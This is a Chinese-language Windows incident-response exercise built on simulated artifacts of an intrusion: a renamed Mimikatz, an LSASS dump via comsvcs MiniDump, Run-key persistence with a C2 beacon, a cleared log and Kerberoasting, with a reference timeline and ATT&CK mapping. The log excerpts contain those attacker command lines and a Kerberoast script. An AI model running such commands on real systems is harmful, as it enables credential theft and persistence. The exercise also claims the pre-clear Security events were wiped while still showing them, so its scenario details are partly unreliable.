# 練習 B — Windows 被入侵主機完整 triage + timeline

> 目標：給定一組真實入侵情境的描述性 artifact（記憶體映像 + $MFT + Event Log + Registry hive），用系統化的 triage 流程還原攻擊者的完整行動——初始感染 → 提權 → 憑證竊取 → 橫向移動，產出帶 ATT&CK 對映的攻擊時間軸與各步的 artifact 佐證清單。

## 背景動機

Part 2（Ch 13–20）分別教了 Windows 記憶體鑑識、檔案系統 artifact、執行痕跡、Registry 鑑識、Event Log 鑑識、Persistence 偵測、憑證竊取與橫向移動鑑識。但真實 IR 從來不是「先看完 MFT，再看 Event Log」——artifact 是交織的，時間軸要靠跨來源關聯才能拼起來。

這個練習的目的是打通各章知識，讓你練習：

1. 決定 triage 優先順序（什麼先看？為什麼？）
2. 跨 artifact 關聯（Registry last write time ↔ Event Log timestamp ↔ $UsnJrnl entry）
3. 用 super timeline 概念把所有 artifact 的時間點統一到 UTC 時間軸
4. 輸出符合 IR 報告標準的攻擊鏈和 ATT&CK 對映表

## 情境描述

**你收到的通報**：2024-03-15（週五）下午 18:00，SIEM 告警：目標主機 `WKSTN-07`（IP：192.168.10.50）對 DC `DC01`（IP：192.168.10.1）發起了異常的 LDAP 查詢，查詢了所有帶 SPN 的服務帳號。安全團隊立即對 WKSTN-07 做了記憶體 dump 和磁碟映像，並抓取了 DC01 的 Event Log。

**你拿到的 artifact（已還原，供分析）：**

- `WKSTN07_memory.dmp`：記憶體映像（16 GB），Volatility3 可讀
- `WKSTN07_disk.E01`：磁碟映像，$MFT / $UsnJrnl / $LogFile 都在，Registry hive 可取
- `WKSTN07_Security.evtx`：WKSTN-07 的 Security Event Log（保留 30 天）
- `WKSTN07_System.evtx`：WKSTN-07 的 System Event Log
- `WKSTN07_Sysmon.evtx`：WKSTN-07 的 Sysmon Operational Log（已部署 Sysmon 13）
- `WKSTN07_PSOperational.evtx`：PowerShell Operational Log
- `DC01_Security.evtx`：DC01 的 Security Event Log
- `WKSTN07_NTUSER.DAT`：使用者 `jsmith` 的 NTUSER.DAT（已離線取）
- `WKSTN07_SOFTWARE.hiv`：HKLM SOFTWARE hive
- `WKSTN07_SYSTEM.hiv`：HKLM SYSTEM hive

**背景資訊：**

- WKSTN-07 使用者：`jsmith`（普通域使用者，不是管理員）
- 上班時間：週一到週五 09:00–18:00
- 安全策略：Sysmon 已部署，Script Block Logging 已開，4688 命令列已開，但 LSASS 存取沒有特別的 EDR 保護（僅 Defender）
- DC01 環境：Windows Server 2022，舉凡 DC 的 Security Log 留 90 天

## 任務規格

### 主任務：還原攻擊鏈

你需要從以上 artifact 還原以下問題的答案：

1. **初始感染**：攻擊者如何進入 WKSTN-07？時間點是什麼？是哪個使用者觸發的？
2. **本地存取**：攻擊者在 WKSTN-07 跑了什麼工具？是否提權？
3. **憑證竊取**：攻擊者是否 dump 了 LSASS？是否跑了 Mimikatz 或類似工具？
4. **Persistence**：攻擊者是否在 WKSTN-07 植入持久化？
5. **橫向移動意圖**：那個觸發告警的 Kerberoasting 行為，確認了嗎？下一步攻擊者打算去哪？

### 輸出要求

1. **攻擊時間軸（Timeline）**：以 UTC 時間排序，每個事件包含：時間、事件描述、artifact 來源（哪個 log / 哪行 registry key）、ATT&CK technique ID
2. **ATT&CK 對映表**：每個識別出的技術編號、名稱、佐證的 artifact 和 Event ID
3. **推薦 containment 行動**：基於 triage 結果，你會建議立刻做什麼？

## 已知關鍵 Artifact 摘要

以下是從各 artifact 中萃取的關鍵記錄，模擬你工具跑出來的結果。（所有資料為示意，依版本/樣本而異）

---

### $MFT / $UsnJrnl（WKSTN-07）

```
[MFT Entry]
2024-03-15 03:05:12Z  CREATE   C:\Users\jsmith\AppData\Local\Temp\inv_scan.exe
2024-03-15 03:05:14Z  CREATE   C:\Users\jsmith\AppData\Local\Temp\lsass.dmp
2024-03-15 03:06:01Z  CREATE   C:\ProgramData\Microsoft\winsupdate.exe
2024-03-15 03:06:11Z  MODIFY   C:\Users\jsmith\NTUSER.DAT        （hive 被修改）
2024-03-15 03:22:11Z  MODIFY   C:\Users\jsmith\NTUSER.DAT        （第二次修改）
2024-03-15 17:44:22Z  CREATE   C:\Users\jsmith\AppData\Local\Temp\kerberoscan.ps1
2024-03-15 17:44:55Z  CREATE   C:\Users\jsmith\AppData\Local\Temp\hashes.txt
```

---

### WKSTN07_Security.evtx（關鍵事件，依時序）

```
2024-03-15 03:02:08Z  4624  LogonType:10  TargetUser:jsmith  Src:192.168.10.99  IpPort:52341
2024-03-15 03:02:08Z  4672  jsmith  SE_BACKUP, SE_DEBUG (應只有普通使用者不會有這些)
2024-03-15 03:04:51Z  4688  C:\Windows\System32\cmd.exe  Parent:explorer.exe
2024-03-15 03:05:01Z  4688  C:\Users\jsmith\AppData\Local\Temp\inv_scan.exe  CmdLine: inv_scan.exe -d lsass.exe
2024-03-15 03:05:12Z  4688  C:\Windows\System32\rundll32.exe  CmdLine: rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass PID> C:\Users\jsmith\AppData\Local\Temp\lsass.dmp full
2024-03-15 03:06:01Z  4688  C:\Users\jsmith\AppData\Local\Temp\inv_scan.exe  CmdLine: inv_scan.exe --copy C:\ProgramData\Microsoft\winsupdate.exe
2024-03-15 03:06:11Z  4688  C:\Windows\System32\reg.exe  CmdLine: reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /d "C:\ProgramData\Microsoft\winsupdate.exe" /f
2024-03-15 03:22:11Z  4688  C:\Windows\System32\reg.exe  CmdLine: reg add "HKCU\...\Run" /v "WinHelp" /d "C:\ProgramData\Microsoft\winsupdate.exe -c 192.168.10.99:443" /f
2024-03-15 03:22:45Z  1102  SubjectUser:jsmith  （Security log cleared）
2024-03-15 17:42:33Z  4624  LogonType:10  TargetUser:jsmith  Src:192.168.10.99  IpPort:58901
2024-03-15 17:44:22Z  4688  C:\Windows\System32\powershell.exe  CmdLine: powershell -ExecutionPolicy Bypass -File C:\Users\jsmith\AppData\Local\Temp\kerberoscan.ps1
```

---

### WKSTN07_Sysmon.evtx（關鍵事件）

```
2024-03-15 03:05:12Z  Event 10  SourceImage: C:\Windows\System32\rundll32.exe
                                TargetImage: C:\Windows\System32\lsass.exe
                                GrantedAccess: 0x1FFFFF
                                CallTrace: ntdll.dll+0x9f1d4 | comsvcs.dll+0x...

2024-03-15 03:05:01Z  Event 1   Image: C:\Users\jsmith\AppData\Local\Temp\inv_scan.exe
                                OriginalFileName: mimikatz.exe
                                CommandLine: inv_scan.exe -d lsass.exe
                                Hashes: MD5=...,SHA256=a9d2...（VirusTotal: 47/71 惡意）

2024-03-15 03:06:01Z  Event 3   Image: C:\Users\jsmith\AppData\Local\Temp\inv_scan.exe
                                DestinationIp: 192.168.10.99
                                DestinationPort: 443

2024-03-15 17:44:22Z  Event 1   Image: C:\Windows\System32\powershell.exe
                                CommandLine: powershell -ExecutionPolicy Bypass -File kerberoscan.ps1

2024-03-15 17:44:30Z  Event 3   Image: C:\Windows\System32\powershell.exe
                                DestinationIp: 192.168.10.1   （DC01）
                                DestinationPort: 88   （Kerberos）
```

---

### WKSTN07_PSOperational.evtx

```
2024-03-15 17:44:22Z  Event 4104  ScriptBlock:
  # Kerberoast
  $userSPNs = Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
  foreach ($u in $userSPNs) {
      $ticket = Get-KerberosTicket -SPN $u.ServicePrincipalName
      Add-Content C:\Users\jsmith\AppData\Local\Temp\hashes.txt $ticket.Hash
  }
```

---

### DC01_Security.evtx（關鍵事件）

```
2024-03-15 17:44:31Z  4769  AccountName: jsmith@CORP.LOCAL
                            ServiceName: MSSQLSvc/db01.corp.local:1433
                            TicketEncryptionType: 0x17
                            TicketOptions: 0x40810000
                            FailureCode: 0x0

2024-03-15 17:44:31Z  4769  AccountName: jsmith@CORP.LOCAL
                            ServiceName: HTTP/web01.corp.local:80
                            TicketEncryptionType: 0x17  
                            FailureCode: 0x0

2024-03-15 17:44:31Z  4769  AccountName: jsmith@CORP.LOCAL
                            ServiceName: CIFS/fileserver.corp.local
                            TicketEncryptionType: 0x17
                            FailureCode: 0x0

  （共 23 個 4769，全部 TicketEncryptionType: 0x17，在 13 秒內完成）
```

---

### WKSTN07_NTUSER.DAT（RegRipper run.pl 輸出）

```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
LastWrite: 2024-03-15 03:22:11Z

  WinHelp   REG_SZ  C:\ProgramData\Microsoft\winsupdate.exe -c 192.168.10.99:443
  WindowsUpdate  REG_SZ  C:\ProgramData\Microsoft\winsupdate.exe
```

---

### Volatility3 輸出（記憶體映像）

```
# vol.py -f WKSTN07_memory.dmp windows.pslist（示意，依版本/樣本而異）
2808  lsass.exe      ...
3044  powershell.exe  parent: cmd.exe(2992)
3052  cmd.exe         parent: explorer.exe

# vol.py windows.cmdline（示意）
3044  powershell.exe  -ExecutionPolicy Bypass -File kerberoscan.ps1
3108  inv_scan.exe    -d lsass.exe

# vol.py windows.netscan（示意）
0x...  powershell.exe  192.168.10.50:58901 → 192.168.10.1:88  ESTABLISHED
0x...  winsupdate.exe  192.168.10.50:49223 → 192.168.10.99:443  ESTABLISHED
```

---

## 期望輸出範例

### 攻擊時間軸

```
UTC 時間              事件                                      Artifact 來源           ATT&CK
─────────────────────────────────────────────────────────────────────────────────────
2024-03-15 03:02:08  jsmith 從 192.168.10.99 RDP 連入          Security 4624 Type 10   T1021.001
2024-03-15 03:02:08  特權登入（含 SeDebug）                    Security 4672           T1134（Token Manip）
2024-03-15 03:04:51  cmd.exe 啟動（explorer 下，RDP session）  Security 4688           -
2024-03-15 03:05:01  inv_scan.exe（= mimikatz.exe）執行        Sysmon Event 1          T1036.005
2024-03-15 03:05:12  rundll32 + comsvcs MiniDump 對 lsass      Sysmon Event 10         T1003.001
2024-03-15 03:05:12  lsass.dmp 建立於 %TEMP%                   $MFT CREATE             T1003.001
2024-03-15 03:06:01  winsupdate.exe 複製到 ProgramData          $MFT + 4688             T1105
2024-03-15 03:06:01  winsupdate.exe 連回 192.168.10.99:443      Sysmon Event 3          T1071.001（C2）
2024-03-15 03:06:11  Run key 植入（WindowsUpdate）             Security 4688 reg.exe   T1547.001
2024-03-15 03:22:11  Run key 更新（WinHelp，含 C2 參數）       Registry last write     T1547.001
2024-03-15 03:22:45  Security log 被清除                        Security 1102           T1070.001
2024-03-15 17:42:33  jsmith 再次從 192.168.10.99 RDP 連入      Security 4624 Type 10   T1021.001
2024-03-15 17:44:22  kerberoscan.ps1 執行（Bypass policy）      Security 4688 / 4104    T1558.003
2024-03-15 17:44:31  DC01 記錄 23 個 RC4 TGS 請求              DC01 Security 4769×23   T1558.003
2024-03-15 17:44:55  hashes.txt 建立（Kerberos hash 存本地）    $MFT CREATE             T1558.003
```

### ATT&CK 對映表

| ATT&CK ID | 技術名稱 | 佐證 Artifact | 信心 |
|---|---|---|---|
| T1021.001 | Remote Desktop Protocol | Security 4624 Type 10 × 2，Src: 192.168.10.99 | 高 |
| T1003.001 | LSASS Memory | Sysmon Event 10（GrantedAccess 0x1FFFFF）+ $MFT lsass.dmp CREATE | 高 |
| T1036.005 | Match Legitimate Name（Masquerading）| Sysmon Event 1 OriginalFileName=mimikatz.exe，Image 命名為 inv_scan.exe | 高 |
| T1105 | Ingress Tool Transfer | Sysmon Event 3（inv_scan 連 192.168.10.99:443）；$MFT winsupdate.exe CREATE | 高 |
| T1071.001 | Web Protocols C2（HTTPS）| Sysmon Event 3（winsupdate.exe → 192.168.10.99:443 持續連線）| 高 |
| T1547.001 | Registry Run Keys | Registry NTUSER Run key，last write 03:06 和 03:22；Security 4688 reg.exe | 高 |
| T1070.001 | Clear Windows Event Log | Security 1102，SubjectUser: jsmith，03:22:45Z | 確定 |
| T1558.003 | Kerberoasting | PS 4104（script content）+ DC01 4769×23（EncType 0x17）| 確定 |
| T1134 | Access Token Manipulation | 4672（jsmith 有 SeDebug，普通使用者不應有）| 中（需確認）|

### 推薦 Containment 行動

1. **立刻隔離 WKSTN-07**（網路隔離，保留記憶體映像）
2. **封鎖 192.168.10.99**（攻擊者 C2 IP）在防火牆和 EDR
3. **強制重設 jsmith 密碼 + 撤銷 Kerberos ticket（klist purge on all machines）**
4. **重設所有帶 SPN 的服務帳號密碼**（Kerberoasting 已拿到 RC4 hash，必須假設已爆破）
5. **稽核 krbtgt 帳號**：確認 Kerberoasting 的 23 個帳號中有沒有高權限帳號，若有需評估是否有後續 PtH/PtT
6. **審查 DC01 的 Security log**：從 03:22 開始到報告時間，有無來自 192.168.10.99 或 WKSTN-07 的橫向移動嘗試

## 實作步驟建議

### Step 1：初始 Triage（目標：5 分鐘內）

決定「第一眼看什麼」：

- Sysmon Event Log 用 Hayabusa 跑一遍，看 level=critical/high 的 alert
- System Event Log 快速掃 7045（服務安裝）
- Security Event Log 找 1102（log 清除）和 4624 Type 10（RDP）

目的是在 5 分鐘內建立「攻擊者有沒有進來，進來用什麼方式」的初步假設。

```bash
hayabusa.exe csv-timeline -f WKSTN07_Sysmon.evtx -o sysmon_timeline.csv
hayabusa.exe csv-timeline -f WKSTN07_Security.evtx -o security_timeline.csv --min-level high
```

### Step 2：建立完整時間軸（目標：30 分鐘）

把所有 artifact 的時間點統一到 UTC 並合併：

**log2timeline / plaso 概念（若有工具）：**

```bash
# 用 plaso 把多個 artifact 合成一個 supertimeline
log2timeline.py --parsers winevtx,usnjrnl,mft plaso.dump WKSTN07_disk.E01

# 輸出 CSV
psort.py -o l2tcsv -w timeline.csv plaso.dump
```

**手動做法（本練習使用）：**

把各 artifact 的關鍵時間點列到一張表，按 UTC 排序：

```
來源               時間（UTC）          事件
Security 4624      03:02:08            RDP 登入
Sysmon Event 1     03:05:01            inv_scan.exe 執行
Sysmon Event 10    03:05:12            LSASS 存取
$MFT               03:05:12            lsass.dmp CREATE
Security 4688      03:06:11            reg.exe Run key 植入
Registry           03:22:11            Run key last write time
Security 1102      03:22:45            log 清除
Security 4624      17:42:33            第二次 RDP 登入
Security 4688      17:44:22            powershell + kerberoscan.ps1
DC Security 4769   17:44:31            Kerberoasting（×23）
$MFT               17:44:55            hashes.txt CREATE
Memory（vol）      triage 時           winsupdate.exe 仍在運行，連 443
```

### Step 3：跨 Artifact 關聯驗證（目標：20 分鐘）

對每個關鍵主張，用至少兩個 artifact 交叉驗證：

| 主張 | 主要 artifact | 次要 artifact（佐證）|
|---|---|---|
| 攻擊者從 .99 RDP 進來 | Security 4624 Type 10 | TermSvc Event 21（若有）、$MFT 的 Recent doc / RDP bitmap cache |
| LSASS 被 dump | Sysmon Event 10 | $MFT lsass.dmp CREATE、4688 rundll32 comsvcs |
| inv_scan.exe = mimikatz | Sysmon Event 1 OriginalFileName | VirusTotal hash 回查（Sysmon 含 SHA256）|
| Run key 在 03:22 種 | Registry last write | Security 4688 reg.exe 命令列 |
| log 清除後 3:22 前的事件是怎麼還原的？ | $MFT + Sysmon（不在 Security log 裡）| Sysmon 不和 Security 在同一個 log，清 1102 清不掉 Sysmon |
| Kerberoasting 是 jsmith 帳號 | DC01 4769 AccountName | PS 4104 Script Block（在 WKSTN-07）|

### Step 4：記憶體鑑識補漏（目標：15 分鐘）

用 Volatility3 確認磁碟 artifact 的推論：

```bash
# 確認進程樹
vol.py -f WKSTN07_memory.dmp windows.pstree.PsTree

# 確認網路連線（C2 是否仍活著）
vol.py -f WKSTN07_memory.dmp windows.netscan.NetScan

# 確認 LSASS dump 操作使用的技術
vol.py -f WKSTN07_memory.dmp windows.handles.Handles --pid <rundll32 PID>
```

如果 winsupdate.exe 在記憶體中仍然有 ESTABLISHED 連線到 192.168.10.99:443，確認 C2 beacon 仍然活著。

### Step 5：產出報告（目標：15 分鐘）

依照上述輸出格式整理：
- 攻擊時間軸（每行含：時間、事件、artifact、ATT&CK）
- ATT&CK 對映表（含信心度）
- 推薦 Containment 行動

## 參考解答

**先自己做完再看。**

<details>
<summary>點開完整攻擊鏈還原與分析</summary>

### 還原出的攻擊鏈

**Phase 1：初始 Access（深夜 03:02 UTC）**

攻擊者在深夜（非工作時間）從 IP 192.168.10.99 以 RDP（Type 10）登入 jsmith 帳號。

- 4624 Type 10 + Src 192.168.10.99 確認 RDP 登入
- 4672（jsmith 有 SeDebugPrivilege）說明帳號在此 session 內取得了特殊 token，可能是攻擊者已提權，或 jsmith 帳號本身被設定了異常 privilege（需確認 AD 帳號設定）
- jsmith 是普通域使用者，深夜 RDP 本身是異常

**Phase 2：憑證竊取（03:05–03:06 UTC）**

攻擊者在 cmd.exe 裡執行 inv_scan.exe：

1. Sysmon Event 1 的 OriginalFileName = `mimikatz.exe` → 確認是改名的 Mimikatz
2. 4688 的 CmdLine 含 `-d lsass.exe` → 嘗試直接 dump 模式
3. 隨後 4688 的 `rundll32.exe comsvcs.dll MiniDump` → 這是「Living off the Land」的 LSASS dump 技術，比直接跑 Mimikatz 更難被 AV 攔；Sysmon Event 10 的 GrantedAccess 0x1FFFFF 確認 lsass.dmp 成功建立
4. $MFT 記錄 lsass.dmp 建立時間 03:05:12Z，和 Sysmon 10 的 timestamp 吻合

**重要細節**：攻擊者用兩步驟——先用 comsvcs.dll 技術建立 minidump（繞 AV），再用改名的 Mimikatz 做其他操作（可能 parse dmp 或 PTH）。Defender 可能被 bypass，但 Sysmon 10 留下了完整記錄。

**Phase 3：C2 建立與 Persistence（03:06–03:22 UTC）**

1. winsupdate.exe 複製到 ProgramData（偽裝成 Windows Update）
2. Sysmon Event 3 記錄 winsupdate.exe 立刻連回 192.168.10.99:443 → C2 beacon 建立
3. 兩次 reg.exe 寫 Run key（03:06 和 03:22），Run key last write time 與 4688 timestamp 完全吻合
4. 記憶體 netscan 顯示 winsupdate.exe 仍然有 ESTABLISHED 連線 → C2 在 triage 時仍然存活

**Phase 4：清 Log（03:22:45 UTC）**

1102 記錄攻擊者清了 Security log，但清不掉自己（1102 仍在）、清不掉 Sysmon（不同 channel）、清不掉 System log。

這就是為什麼我們能還原 03:02–03:22 這段的事件：Security log 的 1102 前面的所有 Security events 都被清了，但 Sysmon 提供了完整的進程/網路記錄，$MFT 提供了檔案時間戳，Registry hive 的 last write time 提供了 persistence 時間點。**多來源 artifact 讓清 log 的效果大打折扣。**

**Phase 5：Kerberoasting（17:42–17:44 UTC）**

攻擊者當天下午再次 RDP 進來，執行 kerberoscan.ps1：

1. PS 4104 完整記錄了 script 內容，包含 `Get-ADUser` 和 TGS 請求邏輯
2. Sysmon Event 3 確認 powershell.exe 對 DC01:88 發起連線
3. DC01 的 4769 × 23 全是 EncType 0x17，在 13 秒內完成 → 確認 Kerberoasting 掃描
4. $MFT 記錄 hashes.txt 建立 → hash 存到本地

**推測下一步**：攻擊者收集了 23 個服務帳號的 RC4 hash，會離線爆破。若破出高權限服務帳號（如 MSSQL 服務帳號有 DA 權限），下一步是 PtH 或 PtT 到 DB01/Web01/fileserver，然後繼續滲透。

### 還原攻擊鏈完整圖

```
[外部] 192.168.10.99（攻擊機）
    │
    │ RDP（Type 10）03:02Z
    ▼
[WKSTN-07] jsmith session
    ├── cmd.exe
    │     ├── inv_scan.exe（= mimikatz.exe）  03:05Z  T1036.005
    │     ├── rundll32 comsvcs LSASS dump    03:05Z  T1003.001
    │     ├── winsupdate.exe copy + Run key  03:06Z  T1547.001
    │     └── reg.exe Run key 更新           03:22Z  T1547.001
    ├── winsupdate.exe → C2 beacon → 192.168.10.99:443  T1071.001
    │
    └── [17:42Z] 第二次 RDP
          └── powershell.exe kerberoscan.ps1
                └── TGS 請求 × 23 → [DC01] 4769 × 23  T1558.003
                └── hashes.txt（本地）
```

### 關鍵學習點

1. **多 artifact 關聯是關鍵**：Security log 被清了，但 Sysmon + $MFT + Registry 的交叉佐證讓我們還原了全部步驟。
2. **OriginalFileName 不能被改名 bypass**：Mimikatz 改名為 inv_scan.exe，但 Sysmon Event 1 的 OriginalFileName 欄位讀 PE 版本資訊，仍然暴露真實身份。
3. **comsvcs.dll MiniDump 是 LOLBIN**：不需要 procdump，用 Windows 自帶的 comsvcs.dll 配合 rundll32 就能 dump LSASS；Defender 難阻攔，但 Sysmon 10 仍然記錄。
4. **深夜 RDP + 非工作時間**：時間異常是告警的低成本觸發條件，03:02 的 RDP 登入在正常環境應該即時告警。
5. **Kerberoasting 的確鑿證據在 DC01**：光看 WKSTN-07 的 log 只能知道「跑了一個 PowerShell script」，DC01 的 4769 才是確鑿的 Kerberoasting 證據——跨機器關聯是 IR 必備能力。

</details>

## 測試用例表

完成練習後，確認你能獨立回答以下問題：

| # | 問題 | 對應 Artifact | 預期答案要點 |
|---|---|---|---|
| 1 | 攻擊者第一次登入的時間和方式？ | Security 4624 | 03:02:08Z，Type 10 RDP，Src 192.168.10.99 |
| 2 | LSASS dump 用了什麼技術？為什麼比直接跑工具更難被 AV 阻？ | Sysmon Event 10 + 4688 | comsvcs.dll MiniDump（LOLBIN），Windows 自帶 DLL，AV 通常不阻 |
| 3 | 如何確認 inv_scan.exe = Mimikatz？ | Sysmon Event 1 | OriginalFileName = mimikatz.exe；SHA256 VirusTotal 47/71 |
| 4 | 攻擊者清了 Security log，為什麼我們還能還原 03:02–03:22 的事件？ | Sysmon + $MFT + Registry | Sysmon 是獨立 channel，不被 1102 影響；$MFT 記錄檔案時間；Registry last write time |
| 5 | Kerberoasting 攻擊的確鑿證據在哪裡？ | DC01 Security 4769 | 23 個 4769，EncType 0x17，13 秒內完成 |
| 6 | C2 Beacon 在 triage 時仍然存活的證據是什麼？ | Volatility3 netscan | winsupdate.exe ESTABLISHED 連線 → 192.168.10.99:443 |
| 7 | 為什麼 Containment 要重設「所有帶 SPN 的服務帳號」？ | DC01 4769 + hashes.txt | 已拿到 RC4 hash，必須假設即將或已經爆破成功 |

## 延伸挑戰

1. **攻擊者是誰？**：192.168.10.99 是內網 IP，不是外網攻擊機。這說明攻擊者先從哪裡進來？如果你能查 192.168.10.99 的 Security log，你期望找到什麼？（提示：初始 Access 在 192.168.10.99，WKSTN-07 是第二跳）

2. **Kerberoasting hash 會不會被用？**：hashes.txt 留在 WKSTN-07 本地。攻擊者有沒有把它外傳？用哪個 artifact 可以查？（提示：Sysmon Event 3 查 powershell/cmd 的外連，或查 $UsnJrnl 的 hashes.txt RENAME/MOVE）

3. **進階 timeline**：如果你有 plaso/log2timeline 環境，把所有 artifact（$MFT + $UsnJrnl + evtx × 5 + Registry hive）合併成一個 supertimeline，過濾 2024-03-15 00:00:00Z 到 2024-03-15 18:00:00Z，你會看到哪些 artifact 在 03:05 周圍密集出現？

4. **防禦建議**：這次事件中有哪些偵測是「成功」的（Sysmon 留下記錄）、哪些是「太晚」的（Kerberoasting 靠 SIEM 告警，但 LSASS dump 沒有即時告警）？如果你是 Detection Engineer，你會加什麼規則？

## 自我檢核

完成練習後，你應該能回答：

- [ ] 我能說出 triage 的優先順序邏輯：為什麼先看 Sysmon 而不是先看 $MFT
- [ ] 我能說出 Security log 被清除後，哪些 artifact 仍然提供了完整的攻擊記錄
- [ ] 我能解釋 comsvcs.dll MiniDump 技術的原理，以及 Sysmon 如何記錄它
- [ ] 我能從 DC 的 4769 數量和加密類型判斷是否為 Kerberoasting
- [ ] 我能產出格式正確的攻擊時間軸，包含 UTC 時間、artifact 來源、ATT&CK ID
- [ ] 我能說出 Containment 的優先順序：哪個動作最緊急，以及原因
- [ ] 我能解釋為什麼「多 artifact 關聯」比單一 artifact 更可靠

---

Windows DFIR 至此完整收尾。下一個 Part 進入 Linux / 網路 / 雲 DFIR，把相同的防守視角帶到不同平台，從 Linux 的 /proc/PID/maps 到 auditd log，從 Zeek 到 CloudTrail。

→ [Ch 21 Linux IR triage](./21-linux-ir-triage.md)
